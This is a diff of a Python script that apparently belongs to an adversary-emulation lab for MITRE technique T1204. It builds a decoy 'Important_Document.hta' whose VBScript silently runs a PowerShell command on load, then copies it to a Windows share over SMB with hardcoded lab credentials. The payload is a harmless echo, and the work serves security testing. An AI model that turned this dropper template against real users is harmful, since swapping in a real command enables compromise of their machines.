@@ -3,61 +3,76 @@
 # Objective: Adversaries may rely on a user executing a malicious file. This script simulates creating a malicious-looking LNK (shortcut) file that would execute a command when clicked by a user.
 
 # t1204_user_execution.py
+import subprocess
 import os
-import struct
 
 # --- Simulation Configuration ---
-# This LNK file, when double-clicked, will launch cmd.exe and echo a message.
-# It's harmless but demonstrates the technique.
-ATTACK_LNK_PATH = "Important_Document.lnk"
-TARGET_EXECUTABLE = "C:\\Windows\\System32\\cmd.exe"
-ARGUMENTS = "/c echo You have been pwned by T1204! & pause"
+# An HTA file is a simple way to deliver cross-platform script execution to Windows.
+MALICIOUS_HTA_FILE = "Important_Document.hta"
+# The PowerShell command to execute. This is harmless but demonstrates the technique.
+PAYLOAD_COMMAND = "powershell.exe -Command 'Write-Host T1204: User execution simulated!'"
+TARGET_IP = "192.168.227.139"
+SHARE_NAME = "LABSHARE"
+USERNAME = "labadmin"
+PASSWORD = "Password123!"
 
-def create_malicious_lnk(lnk_path, target_path, arguments):
+def create_malicious_hta(filename, payload):
     """
-    Simulates T1204 by creating a malicious LNK file.
-    This requires a complex binary structure, so this is a simplified example.
-    A real LNK has more fields for icons, etc.
+    Simulates T1204 by creating a malicious HTA file on the Linux host.
+    This file would then need to be delivered to and opened by a user on the Windows target.
     """
-    print(f"[*] T1204 Simulation: Creating malicious LNK file at '{lnk_path}'")
-    print(f"    - Target: {target_path}")
-    print(f"    - Arguments: {arguments}")
+    print(f"[*] T1204 Simulation: Creating a malicious HTA file for delivery to a Windows user.")
+    
+    hta_content = f"""
+<html>
+<head>
+    <title>Document Viewer</title>
+    <HTA:APPLICATION ID="oHTA" BORDER="thin" BORDERSTYLE="normal" CAPTION="yes" ICON="mstsc.exe" MAXIMIZEBUTTON="yes" MINIMI>
+    <script language="VBScript">
+        Sub Window_OnLoad
+            Set oShell = CreateObject("WScript.Shell")
+            oShell.Run "{payload}", 0, True
+            window.close()
+        End Sub
+    </script>
+</head>
+<body>
+    <p>Loading document, please wait...</p>
+</body>
+</html>
+"""
     
     try:
-        # This is a highly simplified LNK structure. Real LNK files are more complex.
-        # We are creating the minimum viable structure for a working shortcut on Windows.
-        with open(lnk_path, 'wb') as f:
-            # LNK Header
-            f.write(b'L\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46')
-            
-            # LinkTargetIDList (empty)
-            f.write(struct.pack('<H', 0x0000))
-            
-            # LinkInfo (empty for simplicity)
-            f.write(struct.pack('<I', 0x00000000))
-            
-            # StringData
-            # The path to the target executable
-            target_path_bytes = target_path.encode('utf-16le')
-            f.write(struct.pack('<H', len(target_path_bytes)))
-            f.write(target_path_bytes)
-
-            # Arguments string
-            arguments_bytes = arguments.encode('utf-16le')
-            f.write(struct.pack('<H', len(arguments_bytes)))
-            f.write(arguments_bytes)
-
-        print(f"[+] Successfully created malicious LNK file at '{lnk_path}'.")
-        print("[!] In a real attack, a user would be tricked into double-clicking this.")
-        print("[*] Cleaning up created file...")
-        os.remove(lnk_path)
+        with open(filename, 'w') as f:
+            f.write(hta_content.strip())
+        
+        print(f"[+] Successfully created malicious HTA file: '{filename}'")
+        upload_via_smb(filename)
 
     except Exception as e:
-        print(f"[!] An error occurred creating the LNK file: {e}")
+        print(f"[!] An error occurred creating the HTA file: {e}")
+
+def upload_via_smb(filename):
+    print(f"[*] Uploading '{filename}' to Windows share via SMB (T1105).")
+
+    smb_command = (
+        f"smbclient //{TARGET_IP}/{SHARE_NAME} "
+        f"-U {USERNAME}%{PASSWORD} "
+        f"-c 'put {filename}'"
+    )
+
+    result = subprocess.run(
+        smb_command,
+        shell=True,
+        capture_output=True,
+        text=True
+    )
+
+    if result.returncode == 0:
+        print("[+] File successfully uploaded to LABSHARE.")
+    else:
+        print("[!] SMB upload failed.")
+        print(result.stderr)
 
 if __name__ == "__main__":
-    # This script is best run on a Windows host to create a valid .lnk file.
-    if os.name == 'nt':
-        create_malicious_lnk(ATTACK_LNK_PATH, TARGET_EXECUTABLE, ARGUMENTS)
-    else:
-        print("[-] This simulation is designed to run on Windows to create a valid .lnk file.")
+    create_malicious_hta(MALICIOUS_HTA_FILE, PAYLOAD_COMMAND)
